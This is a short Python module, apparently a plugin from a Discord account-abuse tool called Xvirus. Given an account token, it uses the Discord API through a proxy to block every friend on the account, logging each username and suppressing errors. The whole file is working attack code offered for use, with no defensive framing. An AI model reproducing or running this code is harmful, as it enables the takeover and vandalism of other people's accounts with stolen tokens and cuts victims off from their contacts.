import requests
import Xvirus

from colorama import Fore

from util.plugins.common import getheaders, proxy, print_slow

def Block(token, friends):
    #get all friends
    count = 0
    for friend in friends:
        try:
            #block all friends they have
            requests.put(
                f'https://discord.com/api/v10/users/@me/relationships/'+friend['id'], proxies={"http": f'{proxy()}'}, headers=getheaders(token), json={"type": 2})
            count += 1
            print(f"{Fore.GREEN}blocked: {Fore.WHITE}"+friend['user']['username']+"#"+friend['user']['discriminator']+Fore.RESET)
        except Exception as e:
            print(f"The following error has been encountered and is being ignored: {e}")